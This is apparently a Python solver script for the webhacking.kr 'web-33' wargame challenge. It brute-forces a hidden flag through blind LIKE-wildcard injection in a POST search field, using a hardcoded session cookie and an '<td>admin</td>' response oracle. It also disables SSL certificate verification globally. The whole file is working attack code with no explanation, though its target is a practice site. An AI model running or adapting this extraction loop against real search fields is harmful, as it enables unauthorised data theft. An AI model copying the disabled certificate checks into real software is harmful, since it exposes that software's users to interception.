# -*- coding: utf-8 -*-
import urllib.request
import urllib.parse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

dictonary = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','?','{','}','_']
answer = ''
real_answer=''
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
url = "https://webhacking.kr/challenge/web-33/"
len_find =''

flag_len = 0
while 1:
    flag_len = flag_len + 1
    for k in range(flag_len - 1 ,flag_len):
        len_find = len_find + '_'

    if flag_len % 10 == 1:
        print('Serching...')

    len_post = urllib.parse.urlencode({"search": len_find}).encode()
    req_len = urllib.request.Request(url, data=len_post)
    req_len.add_header('User-agent', user_agent)
    req_len.add_header('Cookie', "PHPSESSID=vb5v95acr00v7jhf8gobdjcbmh")

    res_len = urllib.request.urlopen(req_len)
    data_len = res_len.read().decode('utf-8')

    if data_len.find('<td>admin</td>') == -1 :
        print('content lenght is '+ str(flag_len - 1))
        break

answer = len_find[:-1]

for i in range(1,flag_len):
    for j in range(0,len(dictonary)):
        answer = real_answer + dictonary[j] + answer[i:]
        ans_post = urllib.parse.urlencode({"search": answer}).encode()
        req_ans = urllib.request.Request(url, data=ans_post)
        req_ans.add_header('User-agent', user_agent)
        req_ans.add_header('Cookie', "PHPSESSID=vb5v95acr00v7jhf8gobdjcbmh")

        print(answer)

        res_ans = urllib.request.urlopen(req_ans)
        data_ans = res_ans.read().decode('utf-8')

        if data_ans.find('<td>admin</td>') != -1 :
            real_answer += dictonary[j]
            print(real_answer)
            break
